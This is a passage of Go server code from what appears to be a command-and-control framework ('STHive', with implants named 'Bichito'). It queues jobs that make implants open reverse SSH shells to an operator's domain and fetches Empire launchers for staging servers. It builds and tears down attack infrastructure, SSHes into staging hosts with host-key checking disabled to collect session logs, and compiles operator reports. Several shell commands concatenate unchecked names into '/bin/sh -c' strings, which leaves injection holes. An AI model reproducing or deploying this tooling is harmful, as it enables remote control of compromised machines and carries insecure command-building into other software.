    			}

    			//WhiteList Client params

    			if !domainsInputWhite(commandO.Domain){
        			//ErrorLog
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
        			return
    			}

    			if !rsaKeysInputWhite(commandO.Sshkey){
        			//ErrorLog
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
        			return
    			}

    			if !tcpPortInputWhite(commandO.Port){
        			//ErrorLog
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
        			return
    			}

    			if !namesInputWhite(commandO.User){
        			//ErrorLog
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
        			return
    			}

    			//JSON Encode function params 
    			revssshellhparams := InjectRevSshShellBichito{commandO.Domain,commandO.Sshkey,commandO.Port,commandO.User}
				bufBP := new(bytes.Buffer)
				json.NewEncoder(bufBP).Encode(revssshellhparams)
				resultBP := bufBP.String()

				jobO.Parameters = resultBP
				jobO.Job = "injectRevSshShell"

				//Lock shared Slice
    			jobsToProcess.mux.Lock()
    			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			//SYSTEM Jobs

			default:
				time := time.Now().Format("02/01/2006 15:04:05 MST")
				elog := fmt.Sprintf("Job by "+cid+":Bichito(Job not implemented)")
				addLogDB(pid,time,elog)
				return
		}

	}
}

func getEmpireLauncher(stagingName string,bid string) (string,string){

	//var sysinfo string
	var outbuf,errbuf bytes.Buffer
	
	//TO-DO:get OS for Linux vs Windows
	//sysinfo = getBiInfoDB(bid)
	//sysinfoO := jsconcommanA[0]

	//De-serialize paramters
	//jsconcommanA := make([]SysInfo, 0)
	//decoder := json.NewDecoder(bytes.NewBufferString(sysinfo))
	//errD := decoder.Decode(&jsconcommanA)
	// Error Log
	//if errD != nil {
	//	return "Implant-injectEmpire(SysInfo JSON Decoding Error)"+ errD.Error(),""
	//}

	//TO-DO: Adapt to get it on windows as well
	//Read Launcher Saved on Empire Staging Creation
	launchertxtpath := "/usr/local/STHive/stagings/"+stagingName+"/pythonLauncher"
	
	cmd_path := "/bin/sh"
	cmd := exec.Command(cmd_path, "-c","cat "+launchertxtpath)
	cmd.Stdout = &outbuf
	cmd.Stderr = &errbuf
	cmd.Run()
	cmd.Wait()
	if errbuf.String() != "" {
		return "Error Getting Empire Launcher:"+errbuf.String(),""
	}


	return "",outbuf.String()

}

func biChecking(chid string,pid string,parameters string){

	redirectorId,_ := getRedIdbyRidDB(pid)
	implantId,_ := getImplantIdbyRidDB(pid)
	timeNow := time.Now().Format("02/01/2006 15:04:05 MST")
	implantName,_ := getImplantNamebyIdDB(implantId)
	_,implant := getImplantDB(implantName)
	addBiDB(chid,pid,parameters,timeNow,implant.Ttl,implant.Resptime,"Online",redirectorId,implantId)
	setRedLastCheckedDB(pid,timeNow)	

}

func createStaging(stagingName string,stype string,parameters string,vpsName string,domainName string) string{

	var errbuf bytes.Buffer
	//Check existence, and validity of provided implant,vps and domains
	//Implant exist

	extvps,_ := existVpsDB(vpsName)
	extdomain,_ := existDomainDB(domainName)
	usedDomain,_ := isUsedDomainDB(domainName)

	if (!extvps && !extdomain && usedDomain){
		elog := fmt.Sprintf("%s","StagingGeneration(NotExisting VPS/Domain,UsedDomain,DB-Error)")
		return elog
	}

	//Create Folder
	stagingFolder := "/usr/local/STHive/stagings/"+stagingName

	mkdir := exec.Command("/bin/sh","-c","mkdir "+stagingFolder)
	mkdir.Stderr = &errbuf
	mkdir.Start()
	mkdir.Wait()
	mkdirErr := errbuf.String()

	if (mkdirErr != ""){
		//ErrorLog
		errorT := mkdirErr
		elog := fmt.Sprintf("%s%s","StagingGeneration(Folder Creation):",errorT)
		return elog
	}

	//Get not used Random TCP Port [0-65535]
	errPort,tunnelPort := getStagingTunnelPortDB() 
	if (errPort != nil){
		//ErrorLog
		errorT := errPort
		elog := fmt.Sprintf("%s%s","StagingGeneration(TunnelPort Choosing):",errorT)
		return elog
	}


	infraResult := generateStagingInfra(stagingName,stype,tunnelPort,parameters,vpsName,domainName)

	//If fails destroy possible created infra and folder
	if infraResult != "Done" {
		
		destroyStagingInfra(stagingName)
		mkdir := exec.Command("/bin/sh","-c","rm -r "+stagingFolder)
		mkdir.Start()
		mkdir.Wait()
		return infraResult
	}
	
	setUsedDomainDB(domainName,"Yes")

    vpsId,_ := getVpsIdbyNameDB(vpsName)
    domainId,_ := getDomainIdbyNameDB(domainName)

	addStagingDB(stagingName,stype,tunnelPort,parameters,vpsId,domainId)

	return ""

}

func removeStaging(stagingName string) string{

	//Remove infra, if sucessful, remove DB row
	result := destroyStagingInfra(stagingName)
	mkdir := exec.Command("/bin/sh","-c","rm -r /usr/local/STHive/stagings/"+stagingName)
	mkdir.Start()
	mkdir.Wait()
	dname,_,_ := getDomainNbyStagingNameDB(stagingName)
	setUsedDomainDB(dname,"No")
	rmStagingDB(stagingName)
	return result
}

func createReport(reportName string) string{

	var report,implantH string
	var bids []string
	//Get DB Data
	err,jobs := getJobsDB()
	err,implants := getImplantsNameDB()
	err,stagings := getStagingsNameDB() 

	if err != nil {
		return err.Error()
	}

	//Header
	report =
		fmt.Sprintf(
		`
		Report: %s

		`,reportName)

	//Set a timestamp
	time := time.Now().Format("02/01/2006 15:04:05 MST")
	timeS :=
		fmt.Sprintf(
		`
		Creation Time: %s

		`,time)

	report = report + timeS

	hiveJH :=
		fmt.Sprintf(
		`
		Hive Jobs:

		`)

	report = report + hiveJH
	//Hive Jobs and Logs
	for _,job := range jobs{
		if (job.Pid == "Hive"){
			report = report + fmt.Sprintf(
			`
			%s | %s | %s | %s

			%s

			%s

			`,job.Cid,job.Job,job.Time,job.Status,job.Parameters,job.Result)

		}
	}

	//Per implant jobs and logs
	for _,implant := range implants{
		implantH =
			fmt.Sprintf(
			`
			Implant < %s > Jobs:

			`,implant)
		report = report + implantH
		err,bids = getBidsImplantDB(implant)
		if err != nil {
			return err.Error()
		}
		for _,bid := range bids{
			for _,job := range jobs{
				if (job.Chid == bid){
					report = report + fmt.Sprintf(
					`
					%s | %s | %s | %s

					%s

					%s

					`,job.Cid,job.Job,job.Time,job.Status,job.Parameters,job.Result)
				}
			}
		}
	}
	//Go over Stagings and pull interactive data
	var errS,interactiveS string
	for _,staging := range stagings{

		errS,interactiveS = getStagingLog(staging)
		if errS != ""{
			return errS
		}

		report = report + fmt.Sprintf(
		`
		Staging < %s > interactive session:

		%s

		`,staging,interactiveS)
	}

	//Save crafted string on DB

	fmt.Println(report)
	err = addReportDB(reportName,report)
	if err != nil {
		return err.Error()
	} 
	
	return ""
}

func getStagingLog(stagingName string) (string,string){

	//Get Domain
	domain,err,err2 := getDomainbyStagingDB(stagingName)
	domainName,err,err2 := getDomainNbyStagingNameDB(stagingName)
	if (err != nil) || (err2 !=nil){
		return err.Error()+err2.Error(),""
	}

	//Craft Keypath with Domain Name

	keypath := "/usr/local/STHive/stagings/"+stagingName+"/"+domainName+".pem"

	var outbuf,errbuf bytes.Buffer
	interactiveS :=  exec.Command("/bin/sh","-c", "ssh -oStrictHostKeyChecking=no -i "+keypath+" ubuntu@"+domain+" /bin/cat /home/ubuntu/*.log")
	interactiveS.Stdout = &outbuf
	interactiveS.Stderr = &errbuf
	
	interactiveS.Start()
	interactiveS.Wait()

	//if (errbuf.String() != ""){
	//	return "Error Getting Staging Logs"+errbuf.String(),""
	//}

	//REsult will be stdout,if stderr return error
	return "",outbuf.String()

}


func addUser(username string,password string) (string,string){

	genId := fmt.Sprintf("%s%s","C-",randomString(8))
	err := addUserDB(genId,username,password)
	if err != nil {
		return err.Error(),""
	}
	return "",""
}





//// Basic Built-In Server Console
// 

/*
func console(){

	var (

		exit bool 			   = false
		prompt string 		   = "[STConsole]> "
		scanner *bufio.Scanner = bufio.NewScanner(os.Stdin)
		)
		os.Stdout.Write([]byte(prompt))

		// keep scanning input for commands once \n pressed
		for scanner.Scan() {
			command := scanner.Text()
			log.Printf(command)
			if len(command) > 1 {
				argv := strings.Split(command, " ") // argument spaces
				switch argv[0]{

					case "getfingenprint":

						var outbuf,errbuf bytes.Buffer
						hivSign := exec.Command("/bin/sh","-c", "openssl x509 -fingerprint -sha256 -noout -in /usr/local/STHive/certs/hive.pem | cut -d '=' -f2")
						hivSign.Stdout = &outbuf
						hivSign.Stderr = &errbuf
						hivSign.Start()
						hivSign.Wait()
						fmt.Println(strings.Split(outbuf.String(),"\n"))

					case "adduser":
						if len(argv) < 3 {
							fmt.Println("Not enough params\n")
							continue
						}					
						fmt.Println(addUser(argv[1],argv[2]))

					case "exit":
						exit = true
					default:
						fmt.Println("help")
				}
				if exit {
					break
				}
			}
			os.Stdout.Write([]byte(prompt))
		} 
}

*/